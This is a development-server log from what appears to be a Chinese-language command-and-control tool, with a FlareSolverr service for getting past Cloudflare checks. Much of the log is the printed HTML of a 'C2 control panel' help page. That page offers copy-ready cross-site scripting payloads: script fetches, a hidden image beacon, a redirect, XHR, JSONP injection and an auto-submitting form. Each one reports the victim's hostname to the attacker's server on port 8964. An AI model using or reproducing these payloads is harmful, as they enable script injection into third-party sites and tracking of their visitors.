pointer;\n        font-size: 12px;\n        transition: all 0.3s ease;\n    }\n\n    .copy-btn:hover {\n        background: #218838;\n        transform: scale(1.05);\n    }\n\n    .notes-container {\n        display: grid;\n        gap: 15px;\n    }\n\n    .note-item {\n        display: flex;\n        align-items: flex-start;\n        gap: 12px;\n        background: white;\n        padding: 15px 20px;\n        border-radius: 10px;\n        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);\n    }\n\n    .note-icon {\n        font-size: 18px;\n        margin-top: 2px;\n    }\n\n    .note-item p {\n        margin: 0;\n        color: #495057;\n        line-height: 1.6;\n    }\n\n    .test-container {\n        background: white;\n        padding: 25px;\n        border-radius: 12px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n    }\n\n    .test-form {\n        display: grid;\n        grid-template-columns: 1fr 1fr auto;\n        gap: 15px;\n        margin: 20px 0;\n        align-items: end;\n    }\n\n    .test-btn {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n        border: none;\n        padding: 12px 20px;\n        border-radius: 8px;\n        cursor: pointer;\n        font-weight: bold;\n        transition: all 0.3s ease;\n    }\n\n    .test-btn:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);\n    }\n\n    .test-result {\n        margin-top: 20px;\n        padding: 15px;\n        border-radius: 8px;\n        min-height: 20px;\n    }\n\n    .test-result.success {\n        background: linear-gradient(135deg, #d4edda, #c3e6cb);\n        color: #155724;\n        border: 1px solid #c3e6cb;\n    }\n\n    .test-result.error {\n        background: linear-gradient(135deg, #f8d7da, #f5c6cb);\n        color: #721c24;\n        border: 1px solid #f5c6cb;\n    }\n\n    .back-btn {\n        display: inline-block;\n        background: linear-gradient(135deg, #667eea, #764ba2);\n        color: white;\n        padding: 15px 30px;\n        border-radius: 10px;\n        text-decoration: none;\n        font-weight: bold;\n        transition: all 0.3s ease;\n        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);\n    }\n\n    .back-btn:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);\n        text-decoration: none;\n        color: white;\n    }\n\n    @media (max-width: 768px) {\n        .test-form {\n            grid-template-columns: 1fr;\n            gap: 10px;\n        }\n\n        .endpoint-header {\n            flex-direction: column;\n            align-items: flex-start;\n            gap: 10px;\n        }\n    }\n</style>\n\n<script>\n    function copyPayload(button) {\n        const text = button.getAttribute(\'data-payload\');\n        navigator.clipboard.writeText(text).then(function () {\n            // 顯示複製成功提示\n            const originalText = button.textContent;\n            button.textContent = \'✅ 已複製\';\n            button.style.background = \'#28a745\';\n\n            setTimeout(() => {\n                button.textContent = originalText;\n                button.style.background = \'#28a745\';\n            }, 2000);\n        }).catch(function (err) {\n            console.error(\'複製失敗: \', err);\n            alert(\'複製失敗，請手動複製\');\n        });\n    }\n\n    function testGetRequest() {\n        const message = document.getElementById(\'testMessage\').value;\n        const ip = document.getElementById(\'testIP\').value;\n        const resultDiv = document.getElementById(\'testResult\');\n\n        if (!message) {\n            resultDiv.className = \'test-result error\';\n            resultDiv.textContent = \'請輸入測試消息\';\n            return;\n        }\n\n        // 使用相對路徑（因為在同一個域名下）\n        const url = `/api/control/add_message?message=${encodeURIComponent(message)}&target_ip=${encodeURIComponent(ip)}`;\n\n        resultDiv.textContent = \'發送中...\';\n        resultDiv.className = \'test-result\';\n\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \'success\') {\n                    resultDiv.className = \'test-result success\';\n                    resultDiv.innerHTML = `\n                    <strong>✅ 測試成功!</strong><br>\n                    消息: ${data.data.message}<br>\n                    目標IP: ${data.data.target_ip || \'未指定\'}<br>\n                    時間: ${data.data.timestamp}<br>\n                    <small>完整URL: ${window.location.origin}${url}</small>\n                `;\n                } else {\n                    resultDiv.className = \'test-result error\';\n                    resultDiv.textContent = `❌ 錯誤: ${data.error}`;\n                }\n            })\n            .catch(error => {\n                resultDiv.className = \'test-result error\';\n                resultDiv.textContent = `❌ 請求失敗: ${error.message}`;\n            });\n    }\n</script>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:31:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:31:20] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 17:31:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:31:20] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:31:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:31:20] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:33:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 17:33:26 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 17:33:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 0 bytes [200 OK]>
2025-06-24 17:33:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:33:26] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 17:35:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 17:35:31 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 17:35:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 30 bytes [200 OK]>
2025-06-24 17:35:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:35:31] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 17:38:24 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:38:24 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:38:24 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:38:24 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:38:24 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:38:24 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:38:24 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:38:24 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:38:24 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:38:28 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:38:28 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:38:28 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:38:28 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:38:28 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:38:28 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:38:28 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:38:28 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:38:28 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:38:28 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:38:28 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:38:28 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:38:28 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 17:38:28 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:38:28 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:38:28 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:38:28 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:41:21 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:41:21 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:41:21 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:41:21 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:41:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:41:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:41:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:41:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:41:21 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:41:29 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:41:29 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:41:29 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:41:29 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:41:29 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:41:29 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:41:29 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:41:29 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:41:29 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:41:31 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:41:31 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:41:31 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:41:31 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:41:31 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:41:31 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:41:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 17:41:46 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 17:41:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 30 bytes [200 OK]>
2025-06-24 17:41:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:41:46] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 19:34:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 19:34:17 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 19:34:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 19:34:17 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 19:34:17 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 19:34:17 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 19:34:17 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 19:34:17 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 19:34:17 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 19:34:21 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 19:34:21 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 19:34:21 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 19:34:21 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 19:34:22 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 19:34:22 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 19:34:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 19:34:22 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 19:34:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0078s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>C2 控制面板 API 文檔</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<div class="container">\n    <h2>C2 控制面板 API 文檔</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">版本 1.0 - 完整的API使用說明</p>\n\n    <!-- API 端點列表 -->\n    <div class="help-section">\n        <h1>🚀 API 端點</h1>\n        <div class="endpoints-grid">\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge post">POST</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過表單添加控制消息</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">通過網頁表單提交</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過URL參數添加控制消息（適用於XSS攻擊）</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/add_message?message=惡意命令&amp;target_ip=192.168.1.100</code>\n                </div>\n\n                \n                <div class="xss-note">\n                    <span class="xss-badge">XSS</span>\n                    適合嵌入到 XSS 攻擊中\n                </div>\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n                <p class="endpoint-description">獲取所有控制消息列表</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/help</code>\n                </div>\n                <p class="endpoint-description">顯示此幫助頁面</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/help</code>\n                </div>\n\n                \n            </div>\n            \n        </div>\n    </div>\n\n    <!-- XSS 載荷範例 -->\n    <div class="help-section">\n        <h1>🔥 XSS 攻擊載荷範例</h1>\n        <div class="xss-examples">\n            \n            <div class="xss-example-card">\n                <h3>基本 XSS 載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>隱藏的圖片載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>JavaScript 重定向</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Ajax 靜默攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>跨域 JSONP 攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>表單提交攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>下載更多載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">http://{your_ip}:8964/api/control/xss_payload</code>\n                    <button class="copy-btn" data-payload="http://{your_ip}:8964/api/control/xss_payload" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 重要提示 -->\n    <div class="help-section">\n        <h1>⚠️ 重要提示</h1>\n        <div class="notes-container">\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>⚠️ 重要：請將 {your_ip} 替換為您的實際IP地址（例如：192.168.1.100）</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>✅ 完整路徑格式：http://您的IP:8964/api/control/add_message</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🎯 GET 方式添加消息主要用於 XSS 攻擊場景</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>💾 所有消息都會被記錄到數據庫中，便於追踪攻擊來源</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🔧 target_ip 參數是可選的，可以為空或使用 location.hostname 動態獲取</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🌐 消息內容需要進行 URL 編碼以避免特殊字符問題</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>📊 所有請求都會被詳細記錄到系統日誌中</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🚫 注意跨域請求限制，某些載荷可能需要CORS設置</p>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 快速測試區域 -->\n    <div class="help-section">\n        <h1>🧪 快速測試</h1>\n        <div class="test-container">\n            <h3>測試 GET 請求添加消息:</h3>\n            <div class="test-form">\n                <input type="text" id="testMessage" placeholder="輸入測試消息" value="測試消息">\n                <input type="text" id="testIP" placeholder="輸入測試IP" value="127.0.0.1">\n                <button onclick="testGetRequest()" class="test-btn">🚀 發送測試請求</button>\n            </div>\n            <div id="testResult" class="test-result"></div>\n        </div>\n    </div>\n\n    <!-- 返回按鈕 -->\n    <div style="text-align: center; margin-top: 40px;">\n        <a href="/api/control/get_messages" class="back-btn">← 返回控制面板</a>\n    </div>\n</div>\n\n<style>\n    /* 幫助頁面專用樣式 */\n    .help-section {\n        margin: 40px 0;\n        padding: 30px;\n        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);\n        border-radius: 15px;\n        border: 1px solid rgba(102, 126, 234, 0.1);\n    }\n\n    .endpoints-grid {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .endpoint-card {\n        background: white;\n        border-radius: 12px;\n        padding: 25px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #667eea;\n        transition: all 0.3s ease;\n    }\n\n    .endpoint-card:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n    }\n\n    .endpoint-header {\n        display: flex;\n        align-items: center;\n        gap: 15px;\n        margin-bottom: 15px;\n    }\n\n    .method-badge {\n        padding: 5px 12px;\n        border-radius: 20px;\n        font-weight: bold;\n        font-size: 12px;\n        text-transform: uppercase;\n    }\n\n    .method-badge.get {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n    }\n\n    .method-badge.post {\n        background: linear-gradient(135deg, #007bff, #6610f2);\n        color: white;\n    }\n\n    .endpoint-path {\n        background: #f8f9fa;\n        padding: 8px 12px;\n        border-radius: 6px;\n        font-family: \'Courier New\', monospace;\n        color: #495057;\n        border: 1px solid #dee2e6;\n    }\n\n    .endpoint-description {\n        color: #6c757d;\n        font-style: italic;\n        margin-bottom: 15px;\n    }\n\n    .parameters,\n    .example {\n        margin: 15px 0;\n    }\n\n    .parameters h4,\n    .example h4 {\n        color: #495057;\n        margin-bottom: 10px;\n        font-size: 14px;\n    }\n\n    .parameters ul {\n        margin: 10px 0;\n        padding-left: 20px;\n    }\n\n    .parameters li {\n        margin: 5px 0;\n        color: #6c757d;\n    }\n\n    .example-code,\n    .payload-code {\n        background: #2d3748;\n        color: #e2e8f0;\n        padding: 12px 15px;\n        border-radius: 8px;\n        font-family: \'Courier New\', monospace;\n        display: block;\n        overflow-x: auto;\n        white-space: pre-wrap;\n        word-break: break-all;\n    }\n\n    .xss-note {\n        background: linear-gradient(135deg, #fff3cd, #ffeaa7);\n        padding: 10px 15px;\n        border-radius: 8px;\n        margin-top: 15px;\n        border: 1px solid #ffeaa7;\n    }\n\n    .xss-badge {\n        background: #dc3545;\n        color: white;\n        padding: 3px 8px;\n        border-radius: 12px;\n        font-size: 10px;\n        font-weight: bold;\n        margin-right: 8px;\n    }\n\n    .xss-examples {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .xss-example-card {\n        background: white;\n        border-radius: 12px;\n        padding: 20px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #dc3545;\n    }\n\n    .xss-example-card h3 {\n        color: #495057;\n        margin-bottom: 15px;\n        font-size: 16px;\n    }\n\n    .payload-container {\n        position: relative;\n    }\n\n    .copy-btn {\n        position: absolute;\n        top: 10px;\n        right: 10px;\n        background: #28a745;\n        color: white;\n        border: none;\n        padding: 5px 10px;\n        border-radius: 5px;\n        cursor: pointer;\n        font-size: 12px;\n        transition: all 0.3s ease;\n    }\n\n    .copy-btn:hover {\n        background: #218838;\n        transform: scale(1.05);\n    }\n\n    .notes-container {\n        display: grid;\n        gap: 15px;\n    }\n\n    .note-item {\n        display: flex;\n        align-items: flex-start;\n        gap: 12px;\n        background: white;\n        padding: 15px 20px;\n        border-radius: 10px;\n        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);\n    }\n\n    .note-icon {\n        font-size: 18px;\n        margin-top: 2px;\n    }\n\n    .note-item p {\n        margin: 0;\n        color: #495057;\n        line-height: 1.6;\n    }\n\n    .test-container {\n        background: white;\n        padding: 25px;\n        border-radius: 12px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n    }\n\n    .test-form {\n        display: grid;\n        grid-template-columns: 1fr 1fr auto;\n        gap: 15px;\n        margin: 20px 0;\n        align-items: end;\n    }\n\n    .test-btn {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n        border: none;\n        padding: 12px 20px;\n        border-radius: 8px;\n        cursor: pointer;\n        font-weight: bold;\n        transition: all 0.3s ease;\n    }\n\n    .test-btn:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);\n    }\n\n    .test-result {\n        margin-top: 20px;\n        padding: 15px;\n        border-radius: 8px;\n        min-height: 20px;\n    }\n\n    .test-result.success {\n        background: linear-gradient(135deg, #d4edda, #c3e6cb);\n        color: #155724;\n        border: 1px solid #c3e6cb;\n    }\n\n    .test-result.error {\n        